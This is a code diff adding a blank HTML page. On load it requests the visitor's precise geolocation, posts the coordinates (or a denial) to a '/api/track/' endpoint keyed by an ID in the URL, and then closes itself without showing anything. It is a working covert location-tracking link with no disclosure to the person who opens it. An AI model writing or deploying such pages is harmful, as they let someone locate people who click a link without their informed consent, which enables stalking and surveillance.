@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const data = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    time: new Date().toISOString(),
+                    accuracy: position.coords.accuracy
+                };
+                fetch(`/api/track/${window.location.pathname.split('/').pop()}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                }).then(() => {
+                    window.close();
+                });
+            },
+            (error) => {
+                fetch(`/api/track/${window.location.pathname.split('/').pop()}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        time: new Date().toISOString(),
+                        error: 'Geolocation denied'
+                    })
+                }).then(() => {
+                    window.close();
+                });
+            },
+            { enableHighAccuracy: true }
+        );
+    </script>
+</head>
+<body></body>
+</html>
